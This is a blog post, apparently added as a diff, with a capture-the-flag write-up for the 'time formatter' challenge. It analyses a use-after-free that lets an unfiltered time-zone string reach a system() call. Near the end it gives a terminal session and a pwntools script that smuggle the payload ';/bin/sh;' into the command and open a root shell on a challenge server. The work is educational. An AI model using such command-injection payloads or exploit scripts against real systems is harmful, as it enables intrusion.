@@ -1,0 +1,207 @@
+
+<!DOCTYPE html>
+<html lang="default" class="loading">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ADWorld PWN Challenge Area Write-up (time formatter) - TyeYeah&#39;s blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate">
+    <meta name="keywords" content="TyeYeah, CS,"> 
+    <meta name="description" content="blog on Hexo,This task is about UAF (Use After Free).
+time formatterAttachment: time_formatterDescription: It is,"> 
+    <meta name="author" content="TyeYeah"> 
+    <link rel="alternative" href="atom.xml" title="TyeYeah&#39;s blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    <link rel="stylesheet" href="/css/diaspora.css">
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads" src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+</head>
+</html>
+<body class="loading">
+    <span id="config-title" style="display:none">TyeYeah&#39;s blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="Play/Stop" class="iconfont icon-play"></div>
+    <h3 class="subtitle">ADWorld PWN Challenge Area Write-up (time formatter)</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="QR Code" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class="main">
+        <h1 class="title">ADWorld PWN Challenge Area Write-up (time formatter)</h1>
+        <div class="stuff">
+            <span>August 05, 2020</span>
+            
+  <ul class="post-tags-list"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/heap/">heap</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/linux/">linux</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/pwn/">pwn</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/uaf/">uaf</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p>This task is about <code>UAF</code> (Use After Free).</p>
+<h2 id="time-formatter"><a href="#time-formatter" class="headerlink" title="time formatter"></a>time formatter</h2><p>Attachment: <a href="/filehost/apcaw/time_formatter">time_formatter</a><br>Description: It is difficult to convert UNIX time to date, so Mary wrote a tool to accomplish this task.</p>
+<h2 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h2><p>Check:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ file time_formatter</span><br><span class="line">time_formatter: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5afd38988c61546c0035e236ce938af6181e85a6, stripped</span><br><span class="line">$ checksec time_formatter</span><br><span class="line">[*] &apos;/root/time_formatter&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure></p>
+<p>Pseudocode:<br><code>main</code>:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">__gid_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  FILE *v4; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v3 = getegid();</span><br><span class="line">  setresgid(v3, v3, v3);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to Mary's Unix Time Formatter!"</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"1) Set a time format."</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"2) Set a time."</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"3) Set a time zone."</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"4) Print your time."</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"5) Exit."</span>);</span><br><span class="line">      __printf_chk(<span class="number">1L</span>L, <span class="string">"&gt; "</span>);</span><br><span class="line">      v4 = <span class="built_in">stdout</span>;</span><br><span class="line">      fflush(<span class="built_in">stdout</span>);</span><br><span class="line">      <span class="keyword">switch</span> ( sub_400D26() )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          v6 = sub_400E00();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          v6 = sub_400E63();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          v6 = sub_400E43();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">          v6 = sub_400EA3((__int64)v4, (__int64)<span class="string">"&gt; "</span>, v5);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">          v6 = sub_400F8F();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( !v6 );</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><code>sub_400EA3</code> – “4) Print your time.” :<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">sub_400EA3</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">char</span> command; <span class="comment">// [rsp+8h] [rbp-810h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+808h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    __snprintf_chk(</span><br><span class="line">      (__int64)&amp;command,</span><br><span class="line">      <span class="number">2048L</span>L,</span><br><span class="line">      <span class="number">1L</span>L,</span><br><span class="line">      <span class="number">2048L</span>L,</span><br><span class="line">      (__int64)<span class="string">"/bin/date -d @%d +'%s'"</span>,</span><br><span class="line">      (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dword_602120,</span><br><span class="line">      (__int64)ptr,</span><br><span class="line">      a3);</span><br><span class="line">    __printf_chk(<span class="number">1L</span>L, <span class="string">"Your formatted time is: "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">if</span> ( getenv(<span class="string">"DEBUG"</span>) )</span><br><span class="line">      __fprintf_chk(<span class="built_in">stderr</span>, <span class="number">1L</span>L, <span class="string">"Running command: %s\n"</span>, &amp;command, v3);</span><br><span class="line">    setenv(<span class="string">"TZ"</span>, value, <span class="number">1</span>);</span><br><span class="line">    system(&amp;command);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You haven't specified a format!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><code>sub_400F8F</code> – 5) Exit. :<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">sub_400F8F</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_400C7E(ptr);</span><br><span class="line">  sub_400C7E(value);</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"Are you sure you want to exit (y/N)? "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( (s &amp; <span class="number">0xDF</span>) == <span class="number">89</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"OK, exiting."</span>);</span><br><span class="line">    result = <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>Other subfunctions like: “1) Set a time format.”, “2) Set a time.” and “3) Set a time zone.” please check it by yourselves in IDA.</p>
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>To sum up, sub function:</p>
+<ol>
+<li>Do <code>malloc()</code> (in <code>strdup()</code>) for input and assign it to <code>ptr</code>, special characters are limited.</li>
+<li>Receive input and save it to <code>dword_602120</code>.</li>
+<li>Do <code>malloc()</code> for input and assign it to <code>value</code>, without character limit.</li>
+<li>If <code>ptr</code> is not null, call <code>system()</code> to execute commands (consists of <code>dword_602120</code> and <code>ptr</code>)</li>
+<li>first free <code>ptr</code>, then free <code>value</code>, then ask if you exit.</li>
+</ol>
+<p>In subfunction 4 the command is like <code>&quot;/bin/date -d @%d +&#39;%s&#39;&quot;</code>, the <code>ptr</code> will replace <code>%s</code>, so we can input <code>&#39;;/bin/sh;&#39;</code> to do command injection, but the question is <code>&#39;</code> is filtered in subfunction 1.</p>
+<p>In subfunction 3 our input to <code>value</code> will not be restricted. In subfunction 5 it just frees pointers but not exit or sets them null. </p>
+<p>We can exploit <code>UAF</code> to input payload to <code>value</code> and call <code>system()</code> to execute it as <code>ptr</code>: </p>
+<ul>
+<li>First malloc a <code>ptr</code> in subfunc 1</li>
+<li>Second free it in subfunc 5 (first free <code>ptr</code> then free <code>value</code>)</li>
+<li>Then malloc a <code>value</code> in subfunc 3 (using former <code>ptr</code> trunk)</li>
+<li>Finally execute system commands in subfunc 4<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2>We can achieve it in terminal:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">$ ./time_formatter</span><br><span class="line">Welcome to Marys Unix Time Formatter!</span><br><span class="line">1) Set a time format.</span><br><span class="line">2) Set a time.</span><br><span class="line">3) Set a time zone.</span><br><span class="line">4) Print your time.</span><br><span class="line">5) Exit.</span><br><span class="line">&gt; 1                         &lt;-- first malloc</span><br><span class="line">Format:</span><br><span class="line">Format set.</span><br><span class="line">1) Set a time format.</span><br><span class="line">2) Set a time.</span><br><span class="line">3) Set a time zone.</span><br><span class="line">4) Print your time.</span><br><span class="line">5) Exit.</span><br><span class="line">&gt; 5                         &lt;-- free</span><br><span class="line">Are you sure you want to exit (y/N)?</span><br><span class="line">1) Set a time format.</span><br><span class="line">2) Set a time.</span><br><span class="line">3) Set a time zone.</span><br><span class="line">4) Print your time.</span><br><span class="line">5) Exit.</span><br><span class="line">&gt; 3                         &lt;-- second malloc</span><br><span class="line">Time zone: &apos;;/bin/sh;&apos;</span><br><span class="line">Time zone set.</span><br><span class="line">1) Set a time format.</span><br><span class="line">2) Set a time.</span><br><span class="line">3) Set a time zone.</span><br><span class="line">4) Print your time.</span><br><span class="line">5) Exit.</span><br><span class="line">&gt; 4                         &lt;-- execute command</span><br><span class="line">Your formatted time is:</span><br><span class="line"># id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>Or write script (use new method – <code>sendlineafter</code>):<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./time_formatter'</span>)</span><br><span class="line">sh = remote(<span class="string">'220.249.52.133'</span>, <span class="number">47869</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'&gt;'</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.sendline(<span class="string">''</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'&gt;'</span>,<span class="string">'5'</span>)</span><br><span class="line">sh.sendline(<span class="string">''</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'&gt;'</span>,<span class="string">'3'</span>)</span><br><span class="line">sh.sendline(<span class="string">"';/bin/sh;'"</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'&gt;'</span>,<span class="string">'4'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src>
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="https://link.hhtjim.com/163/514216257.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="https://link.hhtjim.com/163/514213582.mp3"></li>
+                        
+                    
+                        
+                            <li title="2" data-url="https://link.hhtjim.com/163/514216237.mp3"></li>
+                        
+                    
+                        
+                            <li title="3" data-url="https://link.hhtjim.com/163/36664350.mp3"></li>
+                        
+                    
+                        
+                            <li title="4" data-url="https://link.hhtjim.com/163/401722197.mp3"></li>
+                        
+                    
+                        
+                            <li title="5" data-url="https://link.hhtjim.com/163/34228815.mp3"></li>
+                        
+                    
+                        
+                            <li title="6" data-url="https://link.hhtjim.com/163/401723178.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link" data-enable="false" data-ae="false" data-ci data-cs data-r data-o data-a data-d="false">View Comments</div>
+
+
+    </div>
+    
+        <div class="side">
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#time-formatter"><span class="toc-number">1.</span> <span class="toc-text">time formatter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Information"><span class="toc-number">2.</span> <span class="toc-text">Information</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">3.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">4.</span> <span class="toc-text">Exploit</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
